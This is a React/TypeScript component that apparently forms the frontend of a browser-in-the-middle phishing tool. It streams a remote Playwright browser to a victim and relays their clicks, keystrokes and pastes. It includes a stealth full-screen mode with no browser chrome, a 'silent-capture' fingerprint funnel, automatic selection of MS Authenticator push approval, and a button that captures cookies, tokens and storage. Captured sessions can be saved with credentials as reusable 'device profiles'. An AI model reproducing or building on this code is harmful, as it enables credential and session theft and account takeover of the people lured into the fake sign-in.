import { useCallback, useEffect, useRef, useState } from "react";
import { X, ArrowLeft, ArrowRight, RotateCw, Send, Download, Clipboard, Smartphone } from "lucide-react";
import { wsUrl, apiFetch } from "../api/client";

interface Props {
  loginUrl: string;
  onClose: () => void;
  onCaptured?: (data: any) => void;
  showCapture?: boolean;
  privateMode?: boolean;
  stealth?: boolean;
  // "full"    — default, full nav bar (back/forward/reload/URL/paste/capture/close)
  // "minimal" — hide back/forward/reload/URL form; keep paste/capture/close
  // "none"    — hide the entire nav bar — just the primary window
  chrome?: "full" | "minimal" | "none";
}

export default function BrowserAuth({ loginUrl, onClose, onCaptured, showCapture = true, privateMode = false, stealth = false, chrome = "full" }: Props) {
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const wsRef = useRef<WebSocket | null>(null);
  const [status, setStatus] = useState("Connecting...");
  const [navUrl, setNavUrl] = useState(loginUrl);
  const [viewport, setViewport] = useState<{ width: number; height: number; mobile: boolean; dpr: number } | null>(null);
  const [sessionId, setSessionId] = useState<string>("");
  const [showRegister, setShowRegister] = useState(false);
  const [regName, setRegName] = useState("");
  const [regWithCreds, setRegWithCreds] = useState(true);
  const [regBusy, setRegBusy] = useState(false);
  const [regResult, setRegResult] = useState<string>("");

  const width = viewport?.width ?? 1280;
  const height = viewport?.height ?? 900;
  const mobile = viewport?.mobile ?? false;
  const dpr = viewport?.dpr ?? 1;
  // Canvas backing buffer is sized at the screenshot's actual pixel
  // dimensions (CSS viewport × DPR) so the higher-res frames don't
  // get downsampled when drawn. CSS scales the canvas back to the
  // viewport size so click coords map cleanly.
  const pixelWidth = Math.round(width * dpr);
  const pixelHeight = Math.round(height * dpr);
  const isTablet = width >= 700 && width <= 900 && mobile;

  useEffect(() => {
    const encoded = encodeURIComponent(loginUrl);
    const params = new URLSearchParams(window.location.search);
    const deviceId = params.get("device_id") || "";
    const startUrl = params.get("url") || params.get("start_url") || "";
    const traceFlag = params.get("trace");
    const traceOn = traceFlag === "true" || traceFlag === "1";
    // `?prefer_push=1` (or =true) auto-clicks the MS Authenticator
    // push approval tile on the sign-in method picker. Works for any
    // headless / remote-server deployment where cross-device passkeys
    // can't (see SESSIONS.md).
    const pushFlag = params.get("prefer_push");
    const pushOn = pushFlag === "1" || pushFlag === "true";
    // Correlation id from the silent-capture funnel (silent.html →
    // /start?cid=… → here). Forwarded to the session so the backend can
    // replay the fingerprint captured for this visitor (see browser.py
    // CID_LINK).
    const cid = params.get("cid") || "";
    // Match the Playwright viewport to the operator's browser window
    // so the canvas fills the visible area without aspect-ratio bars.
    // 36px reserved for the nav bar when chrome is shown.
    const navOffset = chrome === "none" ? 0 : 36;
    const winW = Math.max(640, Math.floor(window.innerWidth));
    const winH = Math.max(480, Math.floor(window.innerHeight - navOffset));
    const extras = [
      privateMode ? "private=true" : "",
      deviceId ? `device_id=${encodeURIComponent(deviceId)}` : "",
      startUrl ? `start_url=${encodeURIComponent(startUrl)}` : "",
      traceOn ? "trace=true" : "",
      pushOn ? "prefer_push=1" : "",
      cid ? `cid=${encodeURIComponent(cid)}` : "",
      `width=${winW}`,
      `height=${winH}`,
    ].filter(Boolean).join("&");
    const ws = new WebSocket(
      wsUrl(`/api/browser/session?login_url=${encoded}${extras ? '&' + extras : ''}`)
    );
    wsRef.current = ws;

    ws.onopen = () => setStatus("Browser loading...");

    ws.onmessage = (event) => {
      if (event.data instanceof Blob) {
        const img = new Image();
        img.onload = () => {
          const canvas = canvasRef.current;
          const ctx = canvas?.getContext("2d");
          if (ctx && canvas) ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
          URL.revokeObjectURL(img.src);
        };
        img.src = URL.createObjectURL(event.data);
      } else {
        try {
          const msg = JSON.parse(event.data);
          if (msg.type === "session_started") setSessionId(msg.session_id || "");
          else if (msg.type === "viewport") setViewport({ width: msg.width, height: msg.height, mobile: msg.mobile, dpr: msg.dpr || 1 });
          else if (msg.type === "status") setStatus(msg.message);
          else if (msg.type === "title") { if (msg.title) document.title = msg.title; }
          else if (msg.type === "navigated" || msg.type === "current_url") setNavUrl(msg.url);
          else if (msg.type === "captured") {
            onCaptured?.(msg);
            setStatus(`Captured: ${msg.cookie_count} cookies, ${msg.token_count} tokens`);
          } else if (msg.type === "post_login_redirect") {
            if (msg.url) {
              setStatus(`Redirecting to ${msg.url}`);
              // BrowserAuth is launched as a popup from the debug
              // dashboard (`window.open(..., 'popup')` in
              // debug_server.py:launchMitmProxy). Navigating the popup
              // itself leaves the dashboard tab parked and looks like a
              // "new tab opened" from the user's perspective. Drive the
              // OPENER instead (the dashboard tab) and close the popup,
              // so the user ends up on the destination in the tab they
              // were originally working in. Falls back to same-tab
              // navigation when there's no opener (e.g., dashboard
              // accessed directly without the popup launcher) or when
              // cross-origin policy blocks opener access.
              try {
                if (window.opener && !window.opener.closed) {
                  window.opener.location.href = msg.url;
                  window.close();
                } else {
                  window.location.href = msg.url;
                }
              } catch {
                window.location.href = msg.url;
              }
            }
          } else if (msg.type === "captured_input") {
            // visible on :8092
          } else if (msg.type === "error") setStatus(`Error: ${msg.message}`);
        } catch {}
      }
    };

    ws.onerror = () => setStatus("Connection error");
    ws.onclose = () => setStatus("Disconnected");

    return () => { ws.close(); };
  }, [loginUrl]);

  const send = useCallback((data: any) => {
    const ws = wsRef.current;
    if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify(data));
  }, []);

  // Attach non-passive wheel listener so preventDefault() works
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const handler = (e: WheelEvent) => {
      e.preventDefault();
      send({ type: "scroll", deltaX: e.deltaX, deltaY: e.deltaY });
    };
    canvas.addEventListener("wheel", handler, { passive: false });
    return () => canvas.removeEventListener("wheel", handler);
  }, [send]);

  // Keep the Playwright viewport in sync with the operator's window —
  // resize is debounced so we don't flood the backend during a drag.
  useEffect(() => {
    if (mobile) return;  // mobile profiles pin the viewport
    let timer: ReturnType<typeof setTimeout> | null = null;
    const onResize = () => {
      const navOffset = chrome === "none" ? 0 : 36;
      const w = Math.max(640, Math.floor(window.innerWidth));
      const h = Math.max(480, Math.floor(window.innerHeight - navOffset));
      send({ type: "resize", width: w, height: h });
    };
    const debounced = () => {
      if (timer) clearTimeout(timer);
      timer = setTimeout(onResize, 200);
    };
    window.addEventListener("resize", debounced);
    return () => {
      window.removeEventListener("resize", debounced);
      if (timer) clearTimeout(timer);
    };
  }, [send, chrome, mobile]);

  const getCoords = (e: React.MouseEvent<HTMLCanvasElement>) => {
    const rect = canvasRef.current!.getBoundingClientRect();
    return {
      x: (e.clientX - rect.left) * (width / rect.width),
      y: (e.clientY - rect.top) * (height / rect.height),
    };
  };

  const pasteClipboard = useCallback(async () => {
    try {
      const text = await navigator.clipboard.readText();
      if (text) send({ type: "type", text });
    } catch (err) {
      setStatus("Clipboard read blocked — focus the canvas and use Ctrl+V (browser may ask for permission)");
    }
  }, [send]);

  const handleKeyDown = (e: React.KeyboardEvent) => {
    // Intercept clipboard shortcuts before the generic typing path:
    // let the browser fire native 'paste'/'copy' events that we handle below.
    if ((e.ctrlKey || e.metaKey) && !e.shiftKey && !e.altKey) {
      const k = e.key.toLowerCase();
      if (k === "v" || k === "c" || k === "x" || k === "a") return;
    }
    e.preventDefault();
    const keyMap: Record<string, string> = {
      Enter: "Enter", Backspace: "Backspace", Tab: "Tab", Escape: "Escape",
      ArrowUp: "ArrowUp", ArrowDown: "ArrowDown", ArrowLeft: "ArrowLeft",
      ArrowRight: "ArrowRight", Delete: "Delete", Home: "Home", End: "End",
    };
    if (keyMap[e.key]) send({ type: "keydown", key: keyMap[e.key] });
    else if (e.key.length === 1) send({ type: "type", text: e.key });
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLCanvasElement>) => {
    e.preventDefault();
    const text = e.clipboardData.getData("text");
    if (text) send({ type: "type", text });
  };

  const submitRegister = useCallback(async () => {
    if (!sessionId) { setRegResult("No session yet"); return; }
    setRegBusy(true); setRegResult("");
    try {
      const body = {
        session_id: sessionId,
        modes: regWithCreds ? ["passive", "creds"] : ["passive"],
        name: regName.trim() || null,
      };
      const res = await apiFetch<{ device: { id: string; name: string } }>(
        "/api/devices/from-session",
        { method: "POST", body: JSON.stringify(body) }
      );
      setRegResult(`Saved as ${res.device.name} (${res.device.id})`);
      setRegName("");
    } catch (err: any) {
      setRegResult(`Failed: ${err?.message || err}`);
    } finally {
      setRegBusy(false);
    }
  }, [sessionId, regName, regWithCreds]);

  // Auto-focus canvas on mount (important for stealth mode where there's no
  // nav bar; we want keyboard input to land immediately).
  useEffect(() => {
    const t = setTimeout(() => canvasRef.current?.focus(), 50);
    return () => clearTimeout(t);
  }, []);

  // Document-level paste handler. Canvas elements don't receive native paste
  // events (paste only fires on input/textarea), so we listen at the document
  // level and check if the browser window is focused. When the user pastes,
  // we extract the clipboard text and send it as a type message.
  useEffect(() => {
    const handleDocumentPaste = (e: ClipboardEvent) => {
      console.log("[Paste] Event fired, hasFocus:", document.hasFocus());
      // Only handle paste if window is focused (user is actively in our app)
      if (document.hasFocus()) {
        const text = e.clipboardData?.getData("text");
        console.log("[Paste] Clipboard text:", text?.length || 0, "chars");
        if (text) {
          e.preventDefault();
          console.log("[Paste] Sending type message with", text.length, "chars");
          send({ type: "type", text });
        }
      }
    };

    document.addEventListener("paste", handleDocumentPaste);
    console.log("[Paste] Document-level paste listener attached");
    return () => document.removeEventListener("paste", handleDocumentPaste);
  }, [send]);

  if (stealth) {
    return (
      <div className="fixed inset-0 bg-black flex items-center justify-center overflow-hidden">
        <canvas ref={canvasRef} width={pixelWidth} height={pixelHeight} tabIndex={0}
          className="cursor-pointer outline-none"
          style={{ width: "100vw", height: "100vh", objectFit: "contain" }}
          onClick={(e) => { const c = getCoords(e); send({ type: "click", ...c }); canvasRef.current?.focus(); }}
          onDoubleClick={(e) => { const c = getCoords(e); send({ type: "dblclick", ...c }); }}
          onKeyDown={handleKeyDown}
          onPaste={handlePaste}
        />
      </div>
    );
  }

  return (
    <div className="fixed inset-0 bg-black z-50 flex flex-col">
      {chrome !== "none" && (
        /* Nav bar */
        <div className="flex items-center gap-2 px-3 py-1.5 border-b border-gray-800 bg-gray-900 shrink-0">
          {chrome === "full" && (
            <>
              <button onClick={() => send({ type: "back" })} className="p-1.5 hover:bg-gray-700 rounded" title="Back">
                <ArrowLeft size={16} />
              </button>
              <button onClick={() => send({ type: "forward" })} className="p-1.5 hover:bg-gray-700 rounded" title="Forward">
                <ArrowRight size={16} />
              </button>
              <button onClick={() => send({ type: "reload" })} className="p-1.5 hover:bg-gray-700 rounded" title="Reload">
                <RotateCw size={16} />
              </button>

              <form className="flex-1 flex gap-1" onSubmit={(e) => { e.preventDefault(); send({ type: "navigate", url: navUrl }); }}>
                <input type="text" value={navUrl} onChange={(e) => setNavUrl(e.target.value)}
                  className="flex-1 bg-gray-800 border border-gray-600 rounded px-3 py-1 text-sm text-gray-100 focus:outline-none focus:border-blue-500"
                  placeholder="Enter URL..." />
                <button type="submit" className="p-1.5 hover:bg-gray-700 rounded" title="Go">
                  <Send size={16} />
                </button>
              </form>
            </>
          )}
          {chrome === "minimal" && <span className="flex-1" />}

          <button onClick={pasteClipboard} className="p-1.5 hover:bg-gray-700 rounded text-gray-300" title="Paste clipboard (or use Ctrl/Cmd+V with canvas focused)">
            <Clipboard size={16} />
          </button>
          {showCapture && <button onClick={() => send({ type: "capture" })} className="px-2 py-1 bg-green-700 hover:bg-green-600 rounded text-xs font-medium text-green-100" title="Capture cookies, tokens & storage">
            <Download size={14} className="inline mr-1" />Capture
          </button>}
          <button
            onClick={() => { setShowRegister((v) => !v); setRegResult(""); }}
            disabled={!sessionId}
            className="px-2 py-1 bg-sky-800 hover:bg-sky-700 rounded text-xs font-medium text-sky-100 disabled:opacity-50"
            title={sessionId ? "Register this session as a device profile" : "Waiting for session..."}
          >
            <Smartphone size={14} className="inline mr-1" />Register device
          </button>
          <span className="text-xs text-gray-500 px-2 truncate max-w-[200px]" title={status}>{status}</span>
          <button onClick={onClose} className="p-1.5 hover:bg-gray-700 rounded text-gray-400 hover:text-white" title="Close session">
            <X size={18} />
          </button>
        </div>
      )}

      {showRegister && (
        <div className="px-3 py-2 border-b border-gray-800 bg-gray-900 shrink-0 flex flex-wrap items-center gap-2 text-xs">
          <span className="text-gray-300 font-medium">Register this session as device:</span>
          <input
            type="text"
            value={regName}
            onChange={(e) => setRegName(e.target.value)}
            placeholder="Profile name (optional)"
            className="bg-gray-800 border border-gray-700 rounded px-2 py-1 text-gray-100 w-64"
          />
          <label className="flex items-center gap-1 text-gray-300">
            <input type="checkbox" checked={regWithCreds}
              onChange={(e) => setRegWithCreds(e.target.checked)} />
            include cookies + storage
          </label>
          <button
            onClick={submitRegister}
            disabled={regBusy || !sessionId}
            className="px-2 py-1 bg-sky-700 hover:bg-sky-600 rounded text-sky-100 disabled:opacity-50"
          >
            {regBusy ? "Saving..." : "Save"}
          </button>
          <button
            onClick={() => { setShowRegister(false); setRegResult(""); }}
            className="px-2 py-1 bg-gray-700 hover:bg-gray-600 rounded text-gray-100"
          >
            Cancel
          </button>
          <span className="text-gray-500">session={sessionId || "—"}</span>
          {regResult && (
            <span className={regResult.startsWith("Failed") ? "text-red-400" : "text-emerald-400"}>
              {regResult}
            </span>
          )}
        </div>
      )}

      {/* Canvas — fills remaining viewport */}
      <div className="flex-1 min-h-0 overflow-auto flex items-start justify-center bg-black">
        <canvas ref={canvasRef} width={pixelWidth} height={pixelHeight} tabIndex={0}
          className="cursor-pointer outline-none"
          style={{ maxWidth: "100%", maxHeight: "100%", objectFit: "contain" }}
          onClick={(e) => { const c = getCoords(e); send({ type: "click", ...c }); canvasRef.current?.focus(); }}
          onDoubleClick={(e) => { const c = getCoords(e); send({ type: "dblclick", ...c }); }}
          onKeyDown={handleKeyDown}
          onPaste={handlePaste}
          />
      </div>
    </div>
  );
}
